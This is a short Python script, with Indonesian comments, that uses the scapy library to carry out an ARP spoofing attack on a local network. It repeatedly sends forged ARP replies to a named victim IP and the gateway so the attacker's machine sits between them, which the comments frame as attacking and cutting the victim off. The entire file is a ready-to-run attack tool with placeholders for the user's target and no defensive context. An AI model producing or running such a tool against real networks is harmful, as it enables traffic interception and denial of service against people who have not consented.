from scapy.all import ARP, send
import time

# Ganti sesuai targetmu
target_ip = "192.168.101.4"   # IP korban
gateway_ip = "192.168.101.1"   # IP gateway

def spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip)
    send(packet, verbose=False)

print(f"[+] Menyerang {target_ip} (putuskan dari {gateway_ip}) ... Tekan CTRL+C untuk berhenti")
try:
    while True:
        spoof(target_ip, gateway_ip)   # bilang ke korban "gateway = aku"
        spoof(gateway_ip, target_ip)   # bilang ke router "korban = aku"
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Stopped.")

